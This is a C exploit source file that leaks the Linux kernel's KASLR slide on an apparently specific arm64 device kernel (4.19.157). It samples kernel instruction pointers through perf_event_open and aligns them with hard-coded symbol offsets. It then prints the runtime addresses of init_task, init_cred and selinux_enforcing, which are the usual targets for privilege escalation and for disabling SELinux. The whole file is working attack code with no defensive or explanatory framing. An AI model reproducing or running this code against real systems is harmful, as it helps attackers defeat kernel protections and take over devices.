/* perf_kaslr.c - KASLR slide leak via perf_event_open (kernel IP sampling)
 * GOT-W29 k4.19.157. Requires shell (perf_event_paranoid=-1, Seccomp=0).
 * Computes slide by aligning sampled kernel IPs with embedded text symbol RVAs.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/perf_event.h>
#include <sys/ioctl.h>
#include <stdlib.h>

#define KIMAGE_TEXT_BASE 0xffffff8008080000ULL   /* link _text */
#define STEXT_LINK 0xffffff8008080800ULL
#define ETEXT_LINK 0xffffff8009e00000ULL

/* text symbol RVAs (link addr - KIMAGE_TEXT_BASE), from boot.elf kallsyms */
static const uint32_t sym_rvas[] = {
  0x0016b8,0x070510,0x070850,0x086258,0x0b0550,0x125248,0x127330,
  0x267ae0,0x274dc0,0x2e5a10,0x191ada8,0x1c23fb8,0x1c24098,0x1c27238,0x1c29dc0,
};
#define NSYMS (sizeof(sym_rvas)/sizeof(sym_rvas[0]))

#define MAXIPS 65536
static uint64_t ips[MAXIPS]; static int nips=0;
static void addip(uint64_t ip){
  for(int i=0;i<nips;i++) if(ips[i]==ip) return;
  if(nips<MAXIPS) ips[nips++]=ip;
}

static int sample_ips(int *out_nsamp){
  struct perf_event_attr pe; memset(&pe,0,sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE; pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 1;
  pe.sample_type = PERF_SAMPLE_IP;
  pe.exclude_kernel = 0; pe.exclude_hv = 0; pe.exclude_user = 1;
  pe.disabled = 1; pe.wakeup_events = 1;
  int fd = syscall(SYS_perf_event_open, &pe, 0, -1, -1, 0);
  if(fd<0){ fprintf(stderr,"perf_open errno=%d(%s)\n",errno,strerror(errno)); return -1; }
  int pg = sysconf(_SC_PAGESIZE);
  size_t sz = (size_t)pg * 129;
  void *base = mmap(NULL, sz, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
  if(base==MAP_FAILED){ close(fd); return -1; }
  struct perf_event_mmap_page *meta=(struct perf_event_mmap_page*)base;
  char *data=(char*)base+pg;
  ioctl(fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  char buf[64]; volatile int acc=0;
  for(int i=0;i<400000;i++){
    int f=open("/dev/null",O_RDONLY); if(f>=0){ acc += read(f,buf,1); close(f); }
    acc += (int)syscall(SYS_getpid);
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  __sync_synchronize();
  uint64_t head=meta->data_head; __sync_synchronize();
  uint64_t tail=meta->data_tail;
  uint64_t wrap = sz - pg;
  uint64_t pos = tail; int nsamp=0, nkern=0;
  while(pos != head && nsamp < 400000){
    struct perf_event_header *h=(struct perf_event_header*)(data + (pos % wrap));
    if(h->type != PERF_RECORD_SAMPLE){ pos += h->size; continue; }
    uint64_t ip = *(uint64_t*)((char*)h + 8);
    nsamp++;
    if(ip >= 0xffff000000000000ULL){ nkern++; addip(ip); }
    pos += h->size;
  }
  meta->data_tail = head;
  munmap(base, sz); close(fd);
  *out_nsamp = nsamp;
  return nkern;
}

int main(void){
  int nsamp=0;
  int nkern = sample_ips(&nsamp);
  if(nkern<0) return 1;
  if(nips < 5){ fprintf(stderr,"too few kernel IPs (%d)\n", nips); return 1; }

  uint64_t lo=~0ULL, hi=0;
  for(int i=0;i<nips;i++){ if(ips[i]<lo)lo=ips[i]; if(ips[i]>hi)hi=ips[i]; }

  /* valid slide range from text containment */
  uint64_t s_lo = hi - ETEXT_LINK;          /* slide such that hi <= etext+slide */
  uint64_t s_hi = lo - STEXT_LINK;          /* slide such that lo >= stext+slide */

  /* search 2MB-aligned slides within the containment-valid range */
  uint64_t start = (s_lo + 0x1fffffULL) & ~0x1fffffULL;   /* round UP to 2MB */
  int best_n=-1; uint64_t best_slide=0;
  for(uint64_t s = start; s <= s_hi; s += 0x200000ULL){
    /* containment: all IPs must be within [stext+slide, etext+slide] */
    int contained=1;
    for(int i=0;i<nips;i++)
      if(ips[i] < STEXT_LINK+s || ips[i] > ETEXT_LINK+s){ contained=0; break; }
    if(!contained) continue;
    int aligned=0;
    for(int i=0;i<nips;i++){
      uint64_t link = ips[i] - s;
      for(int j=0;j<NSYMS;j++){
        uint64_t sym = KIMAGE_TEXT_BASE + sym_rvas[j];
        if(link >= sym && link < sym + 0x40){ aligned++; break; }
      }
    }
    if(aligned>best_n){ best_n=aligned; best_slide=s; }
  }
  if(best_n<0){ fprintf(stderr,"no valid slide in range 0x%llx..0x%llx\n",
                        (unsigned long long)start,(unsigned long long)s_hi); return 1; }

  uint64_t slide = best_slide;
  printf("samples=%d kernel_ips=%d lo=0x%llx hi=0x%llx\n", nsamp, nips,
         (unsigned long long)lo,(unsigned long long)hi);
  printf("KASLR slide=0x%llx aligned=%d\n", (unsigned long long)slide, best_n);
  printf("runtime _stext=0x%llx\n", (unsigned long long)(STEXT_LINK+slide));

  /* key runtime addresses */
  printf("runtime init_task=0x%llx\n", (unsigned long long)(KIMAGE_TEXT_BASE+0x339e100+slide));
  printf("runtime init_cred=0x%llx\n", (unsigned long long)(KIMAGE_TEXT_BASE+0x33ae9c0+slide));
  printf("runtime selinux_enforcing=0x%llx\n", (unsigned long long)(KIMAGE_TEXT_BASE+0x333000+slide));
  printf("runtime boot_id_ctl.data=0x%llx\n", (unsigned long long)(KIMAGE_TEXT_BASE+0x3178300+slide));
  return 0;
}
